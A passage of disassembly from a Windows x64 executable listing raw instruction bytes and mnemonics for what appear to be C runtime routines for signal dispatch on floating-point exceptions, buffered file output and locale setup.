   1400040d9:	48 89 b3 a8 00 00 00 	mov    %rsi,0xa8(%rbx)
   1400040e0:	8b 4a 04             	mov    0x4(%rdx),%ecx
   1400040e3:	83 f9 08             	cmp    $0x8,%ecx
   1400040e6:	0f 85 e8 00 00 00    	jne    0x1400041d4
   1400040ec:	4c 63 15 fd f4 00 00 	movslq 0xf4fd(%rip),%r10        # 0x1400135f0
   1400040f3:	8b 0d fb f4 00 00    	mov    0xf4fb(%rip),%ecx        # 0x1400135f4
   1400040f9:	41 03 ca             	add    %r10d,%ecx
   1400040fc:	4d 8b ca             	mov    %r10,%r9
   1400040ff:	44 3b d1             	cmp    %ecx,%r10d
   140004102:	7d 2a                	jge    0x14000412e
   140004104:	49 c1 e1 04          	shl    $0x4,%r9
   140004108:	48 8b 83 a0 00 00 00 	mov    0xa0(%rbx),%rax
   14000410f:	41 ff c2             	inc    %r10d
   140004112:	49 83 c1 10          	add    $0x10,%r9
   140004116:	4d 89 5c 01 f8       	mov    %r11,-0x8(%r9,%rax,1)
   14000411b:	8b 0d cf f4 00 00    	mov    0xf4cf(%rip),%ecx        # 0x1400135f0
   140004121:	8b 05 cd f4 00 00    	mov    0xf4cd(%rip),%eax        # 0x1400135f4
   140004127:	03 c8                	add    %eax,%ecx
   140004129:	44 3b d1             	cmp    %ecx,%r10d
   14000412c:	7c da                	jl     0x140004108
   14000412e:	81 3a 8e 00 00 c0    	cmpl   $0xc000008e,(%rdx)
   140004134:	8b bb b0 00 00 00    	mov    0xb0(%rbx),%edi
   14000413a:	75 0c                	jne    0x140004148
   14000413c:	c7 83 b0 00 00 00 83 	movl   $0x83,0xb0(%rbx)
   140004143:	00 00 00 
   140004146:	eb 76                	jmp    0x1400041be
   140004148:	81 3a 90 00 00 c0    	cmpl   $0xc0000090,(%rdx)
   14000414e:	75 0c                	jne    0x14000415c
   140004150:	c7 83 b0 00 00 00 81 	movl   $0x81,0xb0(%rbx)
   140004157:	00 00 00 
   14000415a:	eb 62                	jmp    0x1400041be
   14000415c:	81 3a 91 00 00 c0    	cmpl   $0xc0000091,(%rdx)
   140004162:	75 0c                	jne    0x140004170
   140004164:	c7 83 b0 00 00 00 84 	movl   $0x84,0xb0(%rbx)
   14000416b:	00 00 00 
   14000416e:	eb 4e                	jmp    0x1400041be
   140004170:	81 3a 93 00 00 c0    	cmpl   $0xc0000093,(%rdx)
   140004176:	75 0c                	jne    0x140004184
   140004178:	c7 83 b0 00 00 00 85 	movl   $0x85,0xb0(%rbx)
   14000417f:	00 00 00 
   140004182:	eb 3a                	jmp    0x1400041be
   140004184:	81 3a 8d 00 00 c0    	cmpl   $0xc000008d,(%rdx)
   14000418a:	75 0c                	jne    0x140004198
   14000418c:	c7 83 b0 00 00 00 82 	movl   $0x82,0xb0(%rbx)
   140004193:	00 00 00 
   140004196:	eb 26                	jmp    0x1400041be
   140004198:	81 3a 8f 00 00 c0    	cmpl   $0xc000008f,(%rdx)
   14000419e:	75 0c                	jne    0x1400041ac
   1400041a0:	c7 83 b0 00 00 00 86 	movl   $0x86,0xb0(%rbx)
   1400041a7:	00 00 00 
   1400041aa:	eb 12                	jmp    0x1400041be
   1400041ac:	81 3a 92 00 00 c0    	cmpl   $0xc0000092,(%rdx)
   1400041b2:	75 0a                	jne    0x1400041be
   1400041b4:	c7 83 b0 00 00 00 8a 	movl   $0x8a,0xb0(%rbx)
   1400041bb:	00 00 00 
   1400041be:	8b 93 b0 00 00 00    	mov    0xb0(%rbx),%edx
   1400041c4:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400041c9:	41 ff d0             	call   *%r8
   1400041cc:	89 bb b0 00 00 00    	mov    %edi,0xb0(%rbx)
   1400041d2:	eb 07                	jmp    0x1400041db
   1400041d4:	4c 89 5a 08          	mov    %r11,0x8(%rdx)
   1400041d8:	41 ff d0             	call   *%r8
   1400041db:	48 89 ab a8 00 00 00 	mov    %rbp,0xa8(%rbx)
   1400041e2:	e9 e3 fe ff ff       	jmp    0x1400040ca
   1400041e7:	33 c0                	xor    %eax,%eax
   1400041e9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400041ee:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400041f3:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400041f8:	48 83 c4 20          	add    $0x20,%rsp
   1400041fc:	5f                   	pop    %rdi
   1400041fd:	c3                   	ret
   1400041fe:	cc                   	int3
   1400041ff:	cc                   	int3
   140004200:	48 89 0d 11 0f 01 00 	mov    %rcx,0x10f11(%rip)        # 0x140015118
   140004207:	48 89 0d 12 0f 01 00 	mov    %rcx,0x10f12(%rip)        # 0x140015120
   14000420e:	48 89 0d 13 0f 01 00 	mov    %rcx,0x10f13(%rip)        # 0x140015128
   140004215:	48 89 0d 14 0f 01 00 	mov    %rcx,0x10f14(%rip)        # 0x140015130
   14000421c:	c3                   	ret
   14000421d:	cc                   	int3
   14000421e:	cc                   	int3
   14000421f:	cc                   	int3
   140004220:	48 8b 0d 01 0f 01 00 	mov    0x10f01(%rip),%rcx        # 0x140015128
   140004227:	e9 7c f2 ff ff       	jmp    0x1400034a8
   14000422c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140004231:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004236:	57                   	push   %rdi
   140004237:	41 54                	push   %r12
   140004239:	41 55                	push   %r13
   14000423b:	41 56                	push   %r14
   14000423d:	41 57                	push   %r15
   14000423f:	48 83 ec 40          	sub    $0x40,%rsp
   140004243:	8b d9                	mov    %ecx,%ebx
   140004245:	33 ff                	xor    %edi,%edi
   140004247:	89 7c 24 70          	mov    %edi,0x70(%rsp)
   14000424b:	33 f6                	xor    %esi,%esi
   14000424d:	8b d1                	mov    %ecx,%edx
   14000424f:	83 ea 02             	sub    $0x2,%edx
   140004252:	0f 84 09 01 00 00    	je     0x140004361
   140004258:	83 ea 02             	sub    $0x2,%edx
   14000425b:	0f 84 a2 00 00 00    	je     0x140004303
   140004261:	83 ea 02             	sub    $0x2,%edx
   140004264:	0f 84 80 00 00 00    	je     0x1400042ea
   14000426a:	83 ea 02             	sub    $0x2,%edx
   14000426d:	0f 84 90 00 00 00    	je     0x140004303
   140004273:	83 ea 03             	sub    $0x3,%edx
   140004276:	0f 84 87 00 00 00    	je     0x140004303
   14000427c:	83 ea 04             	sub    $0x4,%edx
   14000427f:	74 4d                	je     0x1400042ce
   140004281:	83 ea 06             	sub    $0x6,%edx
   140004284:	74 2c                	je     0x1400042b2
   140004286:	83 fa 01             	cmp    $0x1,%edx
   140004289:	74 5f                	je     0x1400042ea
   14000428b:	e8 14 ee ff ff       	call   0x1400030a4
   140004290:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140004296:	48 21 74 24 20       	and    %rsi,0x20(%rsp)
   14000429b:	45 33 c9             	xor    %r9d,%r9d
   14000429e:	45 33 c0             	xor    %r8d,%r8d
   1400042a1:	33 d2                	xor    %edx,%edx
   1400042a3:	33 c9                	xor    %ecx,%ecx
   1400042a5:	e8 2a ed ff ff       	call   0x140002fd4
   1400042aa:	83 c8 ff             	or     $0xffffffff,%eax
   1400042ad:	e9 d1 01 00 00       	jmp    0x140004483
   1400042b2:	4c 8d 25 67 0e 01 00 	lea    0x10e67(%rip),%r12        # 0x140015120
   1400042b9:	48 8b 0d 60 0e 01 00 	mov    0x10e60(%rip),%rcx        # 0x140015120
   1400042c0:	bf 01 00 00 00       	mov    $0x1,%edi
   1400042c5:	89 7c 24 70          	mov    %edi,0x70(%rsp)
   1400042c9:	e9 aa 00 00 00       	jmp    0x140004378
   1400042ce:	4c 8d 25 5b 0e 01 00 	lea    0x10e5b(%rip),%r12        # 0x140015130
   1400042d5:	48 8b 0d 54 0e 01 00 	mov    0x10e54(%rip),%rcx        # 0x140015130
   1400042dc:	bf 01 00 00 00       	mov    $0x1,%edi
   1400042e1:	89 7c 24 70          	mov    %edi,0x70(%rsp)
   1400042e5:	e9 8e 00 00 00       	jmp    0x140004378
   1400042ea:	4c 8d 25 37 0e 01 00 	lea    0x10e37(%rip),%r12        # 0x140015128
   1400042f1:	48 8b 0d 30 0e 01 00 	mov    0x10e30(%rip),%rcx        # 0x140015128
   1400042f8:	bf 01 00 00 00       	mov    $0x1,%edi
   1400042fd:	89 7c 24 70          	mov    %edi,0x70(%rsp)
   140004301:	eb 75                	jmp    0x140004378
   140004303:	e8 84 f2 ff ff       	call   0x14000358c
   140004308:	48 8b f0             	mov    %rax,%rsi
   14000430b:	48 85 c0             	test   %rax,%rax
   14000430e:	75 08                	jne    0x140004318
   140004310:	83 c8 ff             	or     $0xffffffff,%eax
   140004313:	e9 6b 01 00 00       	jmp    0x140004483
   140004318:	48 8b 90 a0 00 00 00 	mov    0xa0(%rax),%rdx
   14000431f:	48 8b ca             	mov    %rdx,%rcx
   140004322:	4c 63 05 d3 f2 00 00 	movslq 0xf2d3(%rip),%r8        # 0x1400135fc
   140004329:	39 59 04             	cmp    %ebx,0x4(%rcx)
   14000432c:	74 13                	je     0x140004341
   14000432e:	48 83 c1 10          	add    $0x10,%rcx
   140004332:	49 8b c0             	mov    %r8,%rax
   140004335:	48 c1 e0 04          	shl    $0x4,%rax
   140004339:	48 03 c2             	add    %rdx,%rax
   14000433c:	48 3b c8             	cmp    %rax,%rcx
   14000433f:	72 e8                	jb     0x140004329
   140004341:	49 8b c0             	mov    %r8,%rax
   140004344:	48 c1 e0 04          	shl    $0x4,%rax
   140004348:	48 03 c2             	add    %rdx,%rax
   14000434b:	48 3b c8             	cmp    %rax,%rcx
   14000434e:	73 05                	jae    0x140004355
   140004350:	39 59 04             	cmp    %ebx,0x4(%rcx)
   140004353:	74 02                	je     0x140004357
   140004355:	33 c9                	xor    %ecx,%ecx
   140004357:	4c 8d 61 08          	lea    0x8(%rcx),%r12
   14000435b:	4d 8b 2c 24          	mov    (%r12),%r13
   14000435f:	eb 1f                	jmp    0x140004380
   140004361:	4c 8d 25 b0 0d 01 00 	lea    0x10db0(%rip),%r12        # 0x140015118
   140004368:	48 8b 0d a9 0d 01 00 	mov    0x10da9(%rip),%rcx        # 0x140015118
   14000436f:	bf 01 00 00 00       	mov    $0x1,%edi
   140004374:	89 7c 24 70          	mov    %edi,0x70(%rsp)
   140004378:	e8 2b f1 ff ff       	call   0x1400034a8
   14000437d:	4c 8b e8             	mov    %rax,%r13
   140004380:	49 83 fd 01          	cmp    $0x1,%r13
   140004384:	75 07                	jne    0x14000438d
   140004386:	33 c0                	xor    %eax,%eax
   140004388:	e9 f6 00 00 00       	jmp    0x140004483
   14000438d:	4d 85 ed             	test   %r13,%r13
   140004390:	75 0a                	jne    0x14000439c
   140004392:	41 8d 4d 03          	lea    0x3(%r13),%ecx
   140004396:	e8 3d df ff ff       	call   0x1400022d8
   14000439b:	cc                   	int3
   14000439c:	85 ff                	test   %edi,%edi
   14000439e:	74 08                	je     0x1400043a8
   1400043a0:	33 c9                	xor    %ecx,%ecx
   1400043a2:	e8 c5 f8 ff ff       	call   0x140003c6c
   1400043a7:	90                   	nop
   1400043a8:	83 fb 08             	cmp    $0x8,%ebx
   1400043ab:	74 16                	je     0x1400043c3
   1400043ad:	83 fb 0b             	cmp    $0xb,%ebx
   1400043b0:	74 11                	je     0x1400043c3
   1400043b2:	83 fb 04             	cmp    $0x4,%ebx
   1400043b5:	74 0c                	je     0x1400043c3
   1400043b7:	4c 8b 7c 24 38       	mov    0x38(%rsp),%r15
   1400043bc:	44 8b 74 24 70       	mov    0x70(%rsp),%r14d
   1400043c1:	eb 31                	jmp    0x1400043f4
   1400043c3:	4c 8b be a8 00 00 00 	mov    0xa8(%rsi),%r15
   1400043ca:	4c 89 7c 24 38       	mov    %r15,0x38(%rsp)
   1400043cf:	48 83 a6 a8 00 00 00 	andq   $0x0,0xa8(%rsi)
   1400043d6:	00 
   1400043d7:	83 fb 08             	cmp    $0x8,%ebx
   1400043da:	75 13                	jne    0x1400043ef
   1400043dc:	44 8b b6 b0 00 00 00 	mov    0xb0(%rsi),%r14d
   1400043e3:	c7 86 b0 00 00 00 8c 	movl   $0x8c,0xb0(%rsi)
   1400043ea:	00 00 00 
   1400043ed:	eb 05                	jmp    0x1400043f4
   1400043ef:	44 8b 74 24 70       	mov    0x70(%rsp),%r14d
   1400043f4:	83 fb 08             	cmp    $0x8,%ebx
   1400043f7:	75 39                	jne    0x140004432
   1400043f9:	8b 0d f1 f1 00 00    	mov    0xf1f1(%rip),%ecx        # 0x1400135f0
   1400043ff:	8b d1                	mov    %ecx,%edx
   140004401:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   140004405:	8b 05 e9 f1 00 00    	mov    0xf1e9(%rip),%eax        # 0x1400135f4
   14000440b:	03 c8                	add    %eax,%ecx
   14000440d:	3b d1                	cmp    %ecx,%edx
   14000440f:	7d 2a                	jge    0x14000443b
   140004411:	48 63 ca             	movslq %edx,%rcx
   140004414:	48 03 c9             	add    %rcx,%rcx
   140004417:	48 8b 86 a0 00 00 00 	mov    0xa0(%rsi),%rax
   14000441e:	48 83 64 c8 08 00    	andq   $0x0,0x8(%rax,%rcx,8)
   140004424:	ff c2                	inc    %edx
   140004426:	89 54 24 30          	mov    %edx,0x30(%rsp)
   14000442a:	8b 0d c0 f1 00 00    	mov    0xf1c0(%rip),%ecx        # 0x1400135f0
   140004430:	eb d3                	jmp    0x140004405
   140004432:	e8 65 f0 ff ff       	call   0x14000349c
   140004437:	49 89 04 24          	mov    %rax,(%r12)
   14000443b:	85 ff                	test   %edi,%edi
   14000443d:	74 07                	je     0x140004446
   14000443f:	33 c9                	xor    %ecx,%ecx
   140004441:	e8 26 f7 ff ff       	call   0x140003b6c
   140004446:	bf 08 00 00 00       	mov    $0x8,%edi
   14000444b:	3b df                	cmp    %edi,%ebx
   14000444d:	75 0d                	jne    0x14000445c
   14000444f:	8b 96 b0 00 00 00    	mov    0xb0(%rsi),%edx
   140004455:	8b cf                	mov    %edi,%ecx
   140004457:	41 ff d5             	call   *%r13
   14000445a:	eb 05                	jmp    0x140004461
   14000445c:	8b cb                	mov    %ebx,%ecx
   14000445e:	41 ff d5             	call   *%r13
   140004461:	3b df                	cmp    %edi,%ebx
   140004463:	74 0a                	je     0x14000446f
   140004465:	83 fb 0b             	cmp    $0xb,%ebx
   140004468:	74 05                	je     0x14000446f
   14000446a:	83 fb 04             	cmp    $0x4,%ebx
   14000446d:	75 12                	jne    0x140004481
   14000446f:	4c 89 be a8 00 00 00 	mov    %r15,0xa8(%rsi)
   140004476:	3b df                	cmp    %edi,%ebx
   140004478:	75 07                	jne    0x140004481
   14000447a:	44 89 b6 b0 00 00 00 	mov    %r14d,0xb0(%rsi)
   140004481:	33 c0                	xor    %eax,%eax
   140004483:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   140004488:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   14000448c:	49 8b 73 40          	mov    0x40(%r11),%rsi
   140004490:	49 8b e3             	mov    %r11,%rsp
   140004493:	41 5f                	pop    %r15
   140004495:	41 5e                	pop    %r14
   140004497:	41 5d                	pop    %r13
   140004499:	41 5c                	pop    %r12
   14000449b:	5f                   	pop    %rdi
   14000449c:	c3                   	ret
   14000449d:	cc                   	int3
   14000449e:	cc                   	int3
   14000449f:	cc                   	int3
   1400044a0:	48 89 0d 99 0c 01 00 	mov    %rcx,0x10c99(%rip)        # 0x140015140
   1400044a7:	c3                   	ret
   1400044a8:	48 89 0d a1 0c 01 00 	mov    %rcx,0x10ca1(%rip)        # 0x140015150
   1400044af:	c3                   	ret
   1400044b0:	48 89 0d a1 0c 01 00 	mov    %rcx,0x10ca1(%rip)        # 0x140015158
   1400044b7:	c3                   	ret
   1400044b8:	48 83 ec 38          	sub    $0x38,%rsp
   1400044bc:	ff 15 16 9d 00 00    	call   *0x9d16(%rip)        # 0x14000e1d8
   1400044c2:	44 8b d8             	mov    %eax,%r11d
   1400044c5:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1400044c9:	eb 1a                	jmp    0x1400044e5
   1400044cb:	3d 17 00 00 c0       	cmp    $0xc0000017,%eax
   1400044d0:	75 0b                	jne    0x1400044dd
   1400044d2:	b9 08 00 00 00       	mov    $0x8,%ecx
   1400044d7:	ff 15 b3 9c 00 00    	call   *0x9cb3(%rip)        # 0x14000e190
   1400044dd:	45 33 db             	xor    %r11d,%r11d
   1400044e0:	44 89 5c 24 20       	mov    %r11d,0x20(%rsp)
   1400044e5:	41 8b c3             	mov    %r11d,%eax
   1400044e8:	48 83 c4 38          	add    $0x38,%rsp
   1400044ec:	c3                   	ret
   1400044ed:	cc                   	int3
   1400044ee:	cc                   	int3
   1400044ef:	cc                   	int3
   1400044f0:	48 8b c4             	mov    %rsp,%rax
   1400044f3:	48 89 58 10          	mov    %rbx,0x10(%rax)
   1400044f7:	48 89 68 18          	mov    %rbp,0x18(%rax)
   1400044fb:	48 89 70 20          	mov    %rsi,0x20(%rax)
   1400044ff:	89 48 08             	mov    %ecx,0x8(%rax)
   140004502:	57                   	push   %rdi
   140004503:	48 83 ec 20          	sub    $0x20,%rsp
   140004507:	48 8b ca             	mov    %rdx,%rcx
   14000450a:	48 8b da             	mov    %rdx,%rbx
   14000450d:	e8 02 39 00 00       	call   0x140007e14
   140004512:	8b 4b 18             	mov    0x18(%rbx),%ecx
   140004515:	48 63 f0             	movslq %eax,%rsi
   140004518:	f6 c1 82             	test   $0x82,%cl
   14000451b:	75 17                	jne    0x140004534
   14000451d:	e8 82 eb ff ff       	call   0x1400030a4
   140004522:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140004528:	83 4b 18 20          	orl    $0x20,0x18(%rbx)
   14000452c:	83 c8 ff             	or     $0xffffffff,%eax
   14000452f:	e9 34 01 00 00       	jmp    0x140004668
   140004534:	f6 c1 40             	test   $0x40,%cl
   140004537:	74 0d                	je     0x140004546
   140004539:	e8 66 eb ff ff       	call   0x1400030a4
   14000453e:	c7 00 22 00 00 00    	movl   $0x22,(%rax)
   140004544:	eb e2                	jmp    0x140004528
   140004546:	33 ff                	xor    %edi,%edi
   140004548:	f6 c1 01             	test   $0x1,%cl
   14000454b:	74 19                	je     0x140004566
   14000454d:	89 7b 08             	mov    %edi,0x8(%rbx)
   140004550:	f6 c1 10             	test   $0x10,%cl
   140004553:	0f 84 89 00 00 00    	je     0x1400045e2
   140004559:	48 8b 43 10          	mov    0x10(%rbx),%rax
   14000455d:	83 e1 fe             	and    $0xfffffffe,%ecx
   140004560:	48 89 03             	mov    %rax,(%rbx)
   140004563:	89 4b 18             	mov    %ecx,0x18(%rbx)
   140004566:	8b 43 18             	mov    0x18(%rbx),%eax
   140004569:	89 7b 08             	mov    %edi,0x8(%rbx)
   14000456c:	83 e0 ef             	and    $0xffffffef,%eax
   14000456f:	83 c8 02             	or     $0x2,%eax
   140004572:	89 43 18             	mov    %eax,0x18(%rbx)
   140004575:	a9 0c 01 00 00       	test   $0x10c,%eax
   14000457a:	75 2f                	jne    0x1400045ab
   14000457c:	e8 6f 36 00 00       	call   0x140007bf0
   140004581:	48 83 c0 30          	add    $0x30,%rax
   140004585:	48 3b d8             	cmp    %rax,%rbx
   140004588:	74 0e                	je     0x140004598
   14000458a:	e8 61 36 00 00       	call   0x140007bf0
   14000458f:	48 83 c0 60          	add    $0x60,%rax
   140004593:	48 3b d8             	cmp    %rax,%rbx
   140004596:	75 0b                	jne    0x1400045a3
   140004598:	8b ce                	mov    %esi,%ecx
   14000459a:	e8 e1 35 00 00       	call   0x140007b80
   14000459f:	3b c7                	cmp    %edi,%eax
   1400045a1:	75 08                	jne    0x1400045ab
   1400045a3:	48 8b cb             	mov    %rbx,%rcx
   1400045a6:	e8 81 35 00 00       	call   0x140007b2c
   1400045ab:	f7 43 18 08 01 00 00 	testl  $0x108,0x18(%rbx)
   1400045b2:	0f 84 8d 00 00 00    	je     0x140004645
   1400045b8:	8b 2b                	mov    (%rbx),%ebp
   1400045ba:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   1400045be:	2b 6b 10             	sub    0x10(%rbx),%ebp
   1400045c1:	48 8d 42 01          	lea    0x1(%rdx),%rax
   1400045c5:	48 89 03             	mov    %rax,(%rbx)
   1400045c8:	8b 43 24             	mov    0x24(%rbx),%eax
   1400045cb:	ff c8                	dec    %eax
   1400045cd:	3b ef                	cmp    %edi,%ebp
   1400045cf:	89 43 08             	mov    %eax,0x8(%rbx)
   1400045d2:	7e 19                	jle    0x1400045ed
   1400045d4:	44 8b c5             	mov    %ebp,%r8d
   1400045d7:	8b ce                	mov    %esi,%ecx
   1400045d9:	e8 1a 34 00 00       	call   0x1400079f8
   1400045de:	8b f8                	mov    %eax,%edi
   1400045e0:	eb 57                	jmp    0x140004639
   1400045e2:	83 c9 20             	or     $0x20,%ecx
   1400045e5:	89 4b 18             	mov    %ecx,0x18(%rbx)
   1400045e8:	e9 3f ff ff ff       	jmp    0x14000452c
   1400045ed:	83 fe ff             	cmp    $0xffffffff,%esi
   1400045f0:	74 23                	je     0x140004615
   1400045f2:	83 fe fe             	cmp    $0xfffffffe,%esi
   1400045f5:	74 1e                	je     0x140004615
   1400045f7:	48 8b ce             	mov    %rsi,%rcx
   1400045fa:	48 8b c6             	mov    %rsi,%rax
   1400045fd:	48 8d 15 7c 1f 01 00 	lea    0x11f7c(%rip),%rdx        # 0x140016580
   140004604:	83 e1 1f             	and    $0x1f,%ecx
   140004607:	48 c1 f8 05          	sar    $0x5,%rax
   14000460b:	48 6b c9 58          	imul   $0x58,%rcx,%rcx
   14000460f:	48 03 0c c2          	add    (%rdx,%rax,8),%rcx
   140004613:	eb 07                	jmp    0x14000461c
   140004615:	48 8d 0d f4 ef 00 00 	lea    0xeff4(%rip),%rcx        # 0x140013610
   14000461c:	f6 41 08 20          	testb  $0x20,0x8(%rcx)
   140004620:	74 17                	je     0x140004639
   140004622:	33 d2                	xor    %edx,%edx
   140004624:	8b ce                	mov    %esi,%ecx
   140004626:	44 8d 42 02          	lea    0x2(%rdx),%r8d
   14000462a:	e8 31 2b 00 00       	call   0x140007160
   14000462f:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140004633:	0f 84 ef fe ff ff    	je     0x140004528
   140004639:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   14000463d:	8a 44 24 30          	mov    0x30(%rsp),%al
   140004641:	88 01                	mov    %al,(%rcx)
   140004643:	eb 16                	jmp    0x14000465b
   140004645:	bd 01 00 00 00       	mov    $0x1,%ebp
   14000464a:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   14000464f:	8b ce                	mov    %esi,%ecx
   140004651:	44 8b c5             	mov    %ebp,%r8d
   140004654:	e8 9f 33 00 00       	call   0x1400079f8
   140004659:	8b f8                	mov    %eax,%edi
   14000465b:	3b fd                	cmp    %ebp,%edi
   14000465d:	0f 85 c5 fe ff ff    	jne    0x140004528
   140004663:	0f b6 44 24 30       	movzbl 0x30(%rsp),%eax
   140004668:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   14000466d:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   140004672:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140004677:	48 83 c4 20          	add    $0x20,%rsp
   14000467b:	5f                   	pop    %rdi
   14000467c:	c3                   	ret
   14000467d:	cc                   	int3
   14000467e:	cc                   	int3
   14000467f:	cc                   	int3
   140004680:	40 53                	rex push %rbx
   140004682:	48 83 ec 20          	sub    $0x20,%rsp
   140004686:	48 8b d9             	mov    %rcx,%rbx
   140004689:	c6 41 18 00          	movb   $0x0,0x18(%rcx)
   14000468d:	48 85 d2             	test   %rdx,%rdx
   140004690:	0f 85 82 00 00 00    	jne    0x140004718
   140004696:	e8 75 ef ff ff       	call   0x140003610
   14000469b:	48 89 43 10          	mov    %rax,0x10(%rbx)
   14000469f:	48 8b 90 c0 00 00 00 	mov    0xc0(%rax),%rdx
   1400046a6:	48 89 13             	mov    %rdx,(%rbx)
   1400046a9:	48 8b 88 b8 00 00 00 	mov    0xb8(%rax),%rcx
   1400046b0:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   1400046b4:	48 8b 0d 35 f1 00 00 	mov    0xf135(%rip),%rcx        # 0x1400137f0
   1400046bb:	48 3b d1             	cmp    %rcx,%rdx
   1400046be:	74 16                	je     0x1400046d6
   1400046c0:	8b 80 c8 00 00 00    	mov    0xc8(%rax),%eax
   1400046c6:	85 05 44 fa 00 00    	test   %eax,0xfa44(%rip)        # 0x140014110
   1400046cc:	75 08                	jne    0x1400046d6
   1400046ce:	e8 45 1c 00 00       	call   0x140006318
   1400046d3:	48 89 03             	mov    %rax,(%rbx)
   1400046d6:	48 8b 05 63 f5 00 00 	mov    0xf563(%rip),%rax        # 0x140013c40
   1400046dd:	48 39 43 08          	cmp    %rax,0x8(%rbx)
   1400046e1:	74 1b                	je     0x1400046fe
   1400046e3:	48 8b 43 10          	mov    0x10(%rbx),%rax
   1400046e7:	8b 88 c8 00 00 00    	mov    0xc8(%rax),%ecx
   1400046ed:	85 0d 1d fa 00 00    	test   %ecx,0xfa1d(%rip)        # 0x140014110
   1400046f3:	75 09                	jne    0x1400046fe
   1400046f5:	e8 0e 1f 00 00       	call   0x140006608
   1400046fa:	48 89 43 08          	mov    %rax,0x8(%rbx)
   1400046fe:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140004702:	f6 80 c8 00 00 00 02 	testb  $0x2,0xc8(%rax)
   140004709:	75 15                	jne    0x140004720
   14000470b:	83 88 c8 00 00 00 02 	orl    $0x2,0xc8(%rax)
   140004712:	c6 43 18 01          	movb   $0x1,0x18(%rbx)
   140004716:	eb 08                	jmp    0x140004720
   140004718:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   14000471c:	f3 0f 7f 01          	movdqu %xmm0,(%rcx)
   140004720:	48 8b c3             	mov    %rbx,%rax
   140004723:	48 83 c4 20          	add    $0x20,%rsp
   140004727:	5b                   	pop    %rbx
   140004728:	c3                   	ret
   140004729:	cc                   	int3
   14000472a:	cc                   	int3
   14000472b:	cc                   	int3
   14000472c:	40 53                	rex push %rbx
   14000472e:	48 83 ec 20          	sub    $0x20,%rsp
   140004732:	f6 42 18 40          	testb  $0x40,0x18(%rdx)
   140004736:	49 8b d8             	mov    %r8,%rbx
   140004739:	74 0c                	je     0x140004747
   14000473b:	48 83 7a 10 00       	cmpq   $0x0,0x10(%rdx)
   140004740:	75 05                	jne    0x140004747
   140004742:	41 ff 00             	incl   (%r8)
   140004745:	eb 26                	jmp    0x14000476d
   140004747:	83 42 08 ff          	addl   $0xffffffff,0x8(%rdx)
   14000474b:	78 0d                	js     0x14000475a
   14000474d:	48 8b 02             	mov    (%rdx),%rax
   140004750:	88 08                	mov    %cl,(%rax)
   140004752:	48 ff 02             	incq   (%rdx)
   140004755:	0f b6 c1             	movzbl %cl,%eax
   140004758:	eb 08                	jmp    0x140004762
   14000475a:	0f be c9             	movsbl %cl,%ecx
   14000475d:	e8 8e fd ff ff       	call   0x1400044f0
   140004762:	83 f8 ff             	cmp    $0xffffffff,%eax
   140004765:	75 04                	jne    0x14000476b
   140004767:	09 03                	or     %eax,(%rbx)
   140004769:	eb 02                	jmp    0x14000476d
   14000476b:	ff 03                	incl   (%rbx)
   14000476d:	48 83 c4 20          	add    $0x20,%rsp
   140004771:	5b                   	pop    %rbx
   140004772:	c3                   	ret
   140004773:	cc                   	int3
   140004774:	85 d2                	test   %edx,%edx
   140004776:	7e 4c                	jle    0x1400047c4
   140004778:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000477d:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140004782:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004787:	57                   	push   %rdi
   140004788:	48 83 ec 20          	sub    $0x20,%rsp
   14000478c:	49 8b f9             	mov    %r9,%rdi
   14000478f:	49 8b f0             	mov    %r8,%rsi
   140004792:	8b da                	mov    %edx,%ebx
   140004794:	40 8a e9             	mov    %cl,%bpl
   140004797:	4c 8b c7             	mov    %rdi,%r8
   14000479a:	48 8b d6             	mov    %rsi,%rdx
   14000479d:	40 8a cd             	mov    %bpl,%cl
   1400047a0:	ff cb                	dec    %ebx
   1400047a2:	e8 85 ff ff ff       	call   0x14000472c
   1400047a7:	83 3f ff             	cmpl   $0xffffffff,(%rdi)
   1400047aa:	74 04                	je     0x1400047b0
   1400047ac:	85 db                	test   %ebx,%ebx
   1400047ae:	7f e7                	jg     0x140004797
   1400047b0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400047b5:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400047ba:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400047bf:	48 83 c4 20          	add    $0x20,%rsp
   1400047c3:	5f                   	pop    %rdi
   1400047c4:	c3                   	ret
   1400047c5:	cc                   	int3
   1400047c6:	cc                   	int3
   1400047c7:	cc                   	int3
   1400047c8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400047cd:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400047d2:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400047d7:	57                   	push   %rdi
   1400047d8:	48 83 ec 20          	sub    $0x20,%rsp
   1400047dc:	41 f6 40 18 40       	testb  $0x40,0x18(%r8)
   1400047e1:	49 8b f9             	mov    %r9,%rdi
   1400047e4:	49 8b f0             	mov    %r8,%rsi
   1400047e7:	8b da                	mov    %edx,%ebx
   1400047e9:	48 8b e9             	mov    %rcx,%rbp
   1400047ec:	74 0c                	je     0x1400047fa
   1400047ee:	49 83 78 10 00       	cmpq   $0x0,0x10(%r8)
